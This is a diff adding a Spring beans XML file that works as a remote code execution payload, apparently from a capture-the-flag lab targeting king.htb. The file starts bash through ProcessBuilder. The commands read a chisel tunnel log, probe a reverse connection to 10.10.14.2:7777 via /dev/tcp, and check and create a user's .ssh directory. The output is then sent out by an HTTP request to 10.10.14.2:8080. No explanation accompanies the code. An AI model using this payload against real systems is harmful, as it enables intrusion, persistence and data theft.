@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+       http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="pb" class="java.lang.ProcessBuilder">
+        <constructor-arg>
+            <list>
+                <value>/bin/bash</value>
+                <value>-c</value>
+                <value><![CDATA[CAT_LOG=$(cat /tmp/chisel_rev.log 2>&1); CHISEL_TEST=$(timeout 3 bash -c "echo test > /dev/tcp/10.10.14.2/7777" 2>&1 && echo "7777_OK" || echo "7777_BLOCKED"); SSH_CHECK=$(ls -la /home/svc_mq@king.htb/.ssh/ 2>&1); WRITE_TEST=$(mkdir -p /home/svc_mq@king.htb/.ssh 2>&1 && echo "mkdir_ok"); echo "=LOG=$CAT_LOG=7777=$CHISEL_TEST=SSH_DIR=$SSH_CHECK=WRITE=$WRITE_TEST"]]></value>
+            </list>
+        </constructor-arg>
+    </bean>
+    <bean id="proc" factory-bean="pb" factory-method="start"/>
+    <bean id="procOut" factory-bean="proc" factory-method="getInputStream"/>
+    <bean id="outBytes" class="org.springframework.util.FileCopyUtils"
+          factory-method="copyToByteArray">
+        <constructor-arg ref="procOut"/>
+    </bean>
+    <bean id="outStr" class="java.lang.String">
+        <constructor-arg ref="outBytes"/>
+    </bean>
+    <bean id="outUrl" class="java.net.URL" depends-on="outStr">
+        <constructor-arg value="#{'http://10.10.14.2:8080/dbg?v=' + T(java.net.URLEncoder).encode(@outStr,'UTF-8')}"/>
+    </bean>
+    <bean id="outReq" factory-bean="outUrl" factory-method="openStream" depends-on="outUrl"/>
+</beans>
